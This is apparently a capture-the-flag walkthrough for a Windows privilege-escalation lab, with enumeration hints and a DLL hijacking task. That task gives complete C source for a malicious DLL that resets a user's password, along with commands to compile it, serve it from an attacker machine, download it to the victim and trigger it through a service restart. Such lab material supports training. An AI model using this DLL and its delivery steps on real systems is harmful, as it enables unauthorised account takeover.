Windows PrivEsc - Task 2 {Information Gathering}

Question 1:  List users on the target system. One of them resembles a flag. 
{{Hint: net users}}

Question 2: What is the OS version of the target machine?
{{Hint: systeminfo}}

Question 3: When was security update KB4562562 installed?
{{Hint: wmic qfe get HotFixID,InstalledOn | find "KB4562562"}}

Question 4: What is the state of Windows Defender? 
{{Hint: sc query windefend}}


Task 4 {Vulnerable Software}

Question 1:  What version of a Fitbit application can you see installed?
{{Hint}}
To find the name of the app:
wmic service list brief | findstr "Fit"
To find the version:
wmic product where "name='(Name of the Fitbit app, no parenthesis)'" get version

Question 2: What kind of vulnerability seems to affect the Fitbit application?
{{Hint: If you search for fitbit on exploit-db, it's the only one}}

Question 3: What version of FoxitReader is installed on the target system?
{{Hint}}
In Explorer, go to C:\Program Files (x86)\Foxit Software\Foxit Reader
Right click "Foxit Reader" (Application) > Properties > Details


Task 5 {DLL Hijacking}

Question 1: Login with Jack's account (the new password you have set). What is the content of the flagdll.txt file? 
{{Hint:}}

Open a text editor and create a file with the following code, and name it [whatever].c:

#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k net user jack Password11");
        ExitProcess(0);
    }
    return TRUE;
}

Using the mingw compiler, generate the dll:
x86_64-w64-mingw32-gcc whatver.c -shared -o hijackme.dll

Start a webserver on your attacker machine:
python3 -m http.server 9000

On the victim PC, let's grab the malicious dll using powershell.
First, navigate to the Temp folder:
cd C:\Temp\

Then, download the dll from our attacker machine:
wget -O hijackme.dll [your machine IP]:9000(or the port you specified for the server)/hijackme.dll

Using command prompt, restart the dllsvc service on the victim machine:
sc stop dllsvc
sc start dllsvc

If all goes well, the password for user jack should now be changed to "Password11".

Back to powershell, run the following command:
runas /user:jack cmd.exe
enter the password at the prompt

In the new window:
type C:\Users\jack\Documents\flagdll.txt for flag
